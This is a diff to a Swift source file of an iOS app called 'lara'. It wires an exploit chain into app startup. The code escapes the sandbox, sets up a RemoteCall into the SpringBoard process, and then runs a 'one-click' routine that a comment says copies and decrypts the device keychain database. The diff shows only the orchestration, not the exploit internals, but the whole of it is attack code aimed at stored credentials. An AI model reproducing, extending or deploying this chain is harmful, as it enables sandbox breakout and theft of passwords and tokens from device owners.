@@ -160,17 +160,53 @@ struct lara: App {
                     }
                 }
 
-                do {
-                    let result = try LaraKeychainSvc.runOneClickUnwrap(withMaxRows: 0)
-                    DispatchQueue.main.async {
-                        globallogger.log("(kc) keychain pipeline done: \(result ?? [:])")
-                    }
-                } catch {
-                    DispatchQueue.main.async {
-                        globallogger.log("(kc) keychain pipeline failed: \(error.localizedDescription)")
+                DispatchQueue.main.async {
+                    self.prepareAndRunKeychainPipeline()
+                }
+            }
+        }
+    }
+
+    // The framework needs a readable sandbox and a live SpringBoard RemoteCall
+    // before it can copy/decrypt the keychain DB. Escaping the sandbox and
+    // initializing the RemoteCall can only be done on the main queue via laramgr,
+    // so chain: sbx escape -> rcinit(SpringBoard) -> register -> pipeline.
+    private func prepareAndRunKeychainPipeline() {
+        let mgr = self.mgr
+
+        let proceed = {
+            globallogger.log("(kc) initializing SpringBoard RemoteCall before keychain pipeline")
+            mgr.rcinit(process: "SpringBoard") { rcok in
+                guard rcok else {
+                    globallogger.log("(kc) skipped: SpringBoard RemoteCall unavailable")
+                    return
+                }
+                let registered = LaraKeychainSvc.registerSpringBoard(mgr.sbProc)
+                globallogger.log("(kc) registered SpringBoard RemoteCall: \(registered)")
+                DispatchQueue.global(qos: .userInitiated).async {
+                    do {
+                        let result = try LaraKeychainSvc.runOneClickUnwrap(withMaxRows: 0)
+                        DispatchQueue.main.async {
+                            globallogger.log("(kc) keychain pipeline done: \(result ?? [:])")
+                        }
+                    } catch {
+                        DispatchQueue.main.async {
+                            globallogger.log("(kc) keychain pipeline failed: \(error.localizedDescription)")
+                        }
                     }
                 }
             }
+        }
+
+        if mgr.sbxready {
+            proceed()
+            return
+        }
+
+        globallogger.log("(kc) sandbox escape before keychain pipeline")
+        mgr.sbxescape { sbxok in
+            globallogger.log("(kc) sandbox escape: \(sbxok ? "ok" : "failed")")
+            proceed()
         }
     }
 
